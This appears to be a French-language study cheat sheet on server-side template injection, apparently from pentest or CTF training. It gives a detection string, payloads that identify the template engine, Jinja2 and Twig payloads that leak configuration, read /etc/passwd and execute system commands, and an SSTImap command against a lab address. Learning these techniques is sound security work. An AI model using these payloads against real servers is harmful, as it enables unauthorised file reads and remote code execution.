
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

[[#Identifier une SSTI]]
[[#Identifier le Moteur de Template utilisé]]
[[#Exploiter une SSTI]]
[[#Automated SSTI]]

# Identifier une SSTI

> [!TIP]
> Si message d'erreur en injectant des caractères spéciaux, alors potentiellement vulnérable ! (Méthode similaire à une SQLi)

### String test

```
${{<%[%'"}}%\.
```


# Identifier le Moteur de Template utilisé

![[Pasted image 20250225165029.png]]

## Payloads

Smarty ou Mako

```
${7*7}
```

Jinja2 ou Twig

```
{{7*7}}
```

---
### Smarty

```
a{*comment*)b
```
### Mako

```
${"z".join("ab")}
```

---
### Jinja2

Résultat = 7777777

```
{{7*'7'}}
```
### Twig

Résultat = 49

```
{{7*'7'}}
```

# Exploiter une SSTI

## Jinja2

Jinja2 = Souvent utilisé avec Framework Python comme Flask et Django 

### Fuiter la configuration Web
#### Flask

```jinja2
{{ config.items() }}
```

### Fuiter les fonctions built-in
#### Flask

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

### LFI (Local File Inclusion)
#### Flask

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### RCE (Remote Code Execution) 
#### Flask

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```


---

## Twig

Twig = Souvent utilisé avec Framework Php comme Symfony

### LFI (Local File Inclusion)

#### Symfony

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

### RCE (Remote Code Execution) 

```twig
{{ ['id'] | filter('system') }}
```



# Automated SSTI

## SSTIMap

```bash
python3 sstimap.py -u http://83.136.255.243:39076/index.php?name=test
```
